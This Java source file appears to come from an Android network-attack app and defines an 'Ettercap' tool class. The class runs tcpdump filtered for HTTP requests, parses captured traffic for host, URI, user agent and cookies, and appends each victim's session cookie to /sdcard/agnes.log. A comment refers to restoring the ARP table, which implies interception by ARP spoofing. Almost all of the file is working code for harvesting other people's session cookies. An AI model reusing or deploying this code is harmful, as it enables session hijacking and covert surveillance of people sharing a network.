package me.liet.agens.tools;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.regex.Pattern;

import me.liet.agnes.core.Shell.OutputReceiver;
import android.content.Context;
import android.util.Log;



public class Ettercap extends Tool
{
  public Ettercap(Context context){
    super("tcpdump/tcpdump", context);
  }
 
  public static abstract class OnAccountListener implements OutputReceiver
  {
	  
	public static class Request {
			private static String method;// 请求方法   
			private static String protocol;// 协议版本   
			private static String requestURL;   
			private static String requestURI;//请求的URI地址 在HTTP请求的第一行的请求方法后面   
			private static String host;//请求的主机信息   
			private static String Connection;//Http请求连接状态信息 对应HTTP请求中的Connection   
			private static String agent;// 代理，用来标识代理的浏览器信息 ,对应HTTP请求中的User-Agent:   
		    private static String language;//对应Accept-Language   
			private static String encoding;//请求的编码方式 对应HTTP请求中的Accept-Encoding   
			private static String charset;//请求的字符编码 对应HTTP请求中的Accept-Charset   
			private static String accept;// 对应HTTP请求中的Accept;   
			private static String cookie;
			  
		 public String getCookie() {
				return cookie;
			}
			public void setCookie(String cookie) {
				this.cookie = cookie;
			}
		public String getMethod() {
			return method;
		}
		public void setMethod(String method) {
			Request.method = method;
		}
		public String getProtocol() {
			return protocol;
		}
		public void setProtocol(String protocol) {
			this.protocol = protocol;
		}
		public String getRequestURL() {
			return requestURL;
		}
		public void setRequestURL(String requestURL) {
			this.requestURL = requestURL;
		}
		public String getRequestURI() {
			return requestURI;
		}
		public void setRequestURI(String requestURI) {
			this.requestURI = requestURI;
		}
		public String getHost() {
			return host;
		}
		public void setHost(String host) {
			this.host = host;
		}
		public String getConnection() {
			return Connection;
		}
		public void setConnection(String connection) {
			Connection = connection;
		}
		public String getAgent() {
			return agent;
		}
		public void setAgent(String agent) {
			this.agent = agent;
		}
		public String getLanguage() {
			return language;
		}
		public void setLanguage(String language) {
			this.language = language;
		}
		public String getEncoding() {
			return encoding;
		}
		public void setEncoding(String encoding) {
			this.encoding = encoding;
		}
		public String getCharset() {
			return charset;
		}
		public void setCharset(String charset) {
			this.charset = charset;
		}
		public String getAccept() {
			return accept;
		}
		public void setAccept(String accept) {
			this.accept = accept;
		}

		public static String go(){
			Log.v("go", requestURI+cookie+host+agent);
			
			File file = new File("/sdcard/agnes.log");
		    try {  
	            FileWriter filerWriter = new FileWriter(file, true);
	            BufferedWriter bufWriter = new BufferedWriter(filerWriter);
	            bufWriter.write(host);
	            bufWriter.newLine();
	            bufWriter.write("uri:"+requestURI);
	            bufWriter.newLine();
	            bufWriter.write("ua:"+agent);
	            bufWriter.newLine();
	            bufWriter.write("cookie:"+cookie);
	            bufWriter.newLine();  
	            bufWriter.close();  
	            filerWriter.close();  
	        } catch (IOException e) {  
	            // TODO Auto-generated catch block  
	            e.printStackTrace();  
	        }  
	        method ="";
			protocol = "";// 协议版本   
		    requestURL ="";   
			requestURI ="";//请求的URI地址 在HTTP请求的第一行的请求方法后面   
		    host ="";//请求的主机信息   
			Connection ="";//Http请求连接状态信息 对应HTTP请求中的Connection   
			agent ="";// 代理，用来标识代理的浏览器信息 ,对应HTTP请求中的User-Agent:   
			language ="";//对应Accept-Language   
			encoding ="";//请求的编码方式 对应HTTP请求中的Accept-Encoding   
			charset = "";//请求的字符编码 对应HTTP请求中的Accept-Charset   
			accept = "";// 对应HTTP请求中的Accept;   
			cookie = "";
	        return "";
		}
	} 
	
	private static Request request = null;
	
	private static int count = 0;
	
    private static final Pattern ACCOUNT_PATTERN = Pattern.compile("^([^\\s]+)\\s+:\\s+([^\\:]+):(\\d+).+", Pattern.CASE_INSENSITIVE);

    @Override
    public void onStart(String command){

    }

    @Override
    public void onNewLine(String line){
    	request = (request == null ? new Request() : request);

        //Log.v("AGNES",String.valueOf(line.length()));
    	Log.v("LINE",String.valueOf(line.length()));
    	Log.v("LINE",line);
    	
        if(line.contains("ethertype")|| line.indexOf("IPv4") > 0){
        	//发送请求
        	//Log.v("go2", request.getRequestURI()+request.getCookie()+request.getHost()+request.getAgent());
        	if(request.getHost() != null && request.getHost().length() > 5){
        		onAccount(request.getHost());
        		request.go();
        	}
        	
        	
        	//request =null;
        }
        
    	//request = new Request();
    	if(line.contains("GET")){    		
    		request.setMethod("GET");
    		int indexGet = line.indexOf("GET");
    		request.setRequestURI(line.substring(indexGet+3)); 
    	} else  if (line.startsWith("Accept:")) {  
            String accept = line.substring("Accept:".length() + 1);
            request.setAccept(accept);
        //request.setAccept(accept);  
  
        } else if (line.startsWith("User-Agent:")) {  
            String agent = line.substring("User-Agent:".length() + 1);
            request.setAgent(agent);
        } else if (line.startsWith("Host:")) {  
        String host = line.substring("Host:".length() + 1);
        request.setHost(host);      
    } else if (line.startsWith("Accept-Language:")) {  
        String language = line.substring("Accept-Language:".length() + 1);
        request.setLanguage(language);       
    } else if (line.startsWith("Accept-Charset:")) {  
        String charset = line.substring("Accept-Charset:".length() + 1);
        request.setCharset(charset); 
    } else if (line.startsWith("Accept-Encoding:")) {  
        String encoding = line.substring("Accept-Encoding:".length() + 1);
        request.setEncoding(encoding); 
    } else if(line.startsWith("Cookie")){
    	String cookie = line.substring("Cookie:".length() + 1);
    	request.setCookie(cookie);
    }
      
     

    }

    @Override
    public void onEnd(int exitCode){

    }

    public abstract void onAccount(String host);
  }

  public Thread dissect(OnAccountListener listener){
    String commandLine;

    commandLine = " -AvvennSs 0  tcp[20:2]=0x4745 or tcp[20:2]=0x4854";

    return super.async(commandLine, listener, true);
  }

  public boolean kill(){
    // Ettercap needs SIGINT ( ctrl+c ) to restore arp table.
    return super.kill("SIGINT");
  }
}
